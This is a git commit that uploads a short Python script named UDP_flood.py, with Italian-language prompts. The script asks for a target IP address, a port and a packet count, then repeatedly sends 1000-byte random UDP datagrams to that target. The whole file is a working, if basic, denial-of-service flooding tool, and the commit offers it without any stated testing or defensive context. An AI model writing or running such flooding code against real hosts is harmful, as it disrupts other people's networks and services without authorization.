0da1dd02aea9ca5eeb053adf32eefd4ca452e236
skemasche <116719584+skemasche@users.noreply.github.com>
2022-11-08 16:54:31 +0100

    Add files via upload

---
+++ UDP_flood.py
@@ -0,0 +1,21 @@
+import socket
+import os
+import random
+
+ip = input("Inserire indirizzo ip: ")
+porta =int( input("\n inserire porta:"))
+npak = int( input("\n inserire il numero di pacchetti da inviare:"))
+bytes = os.urandom(1000)
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+puntapak= int(0)
+while 1 == 1:
+	try:
+		if puntapak > npak:
+			quit()
+		else:
+			socket.sendto(bytes,(ip, porta))
+			puntapak = puntapak+1
+			print (puntapak, ip, porta)
+	except KeyboardInterrupt:
+		print ("stop")
+		quit()
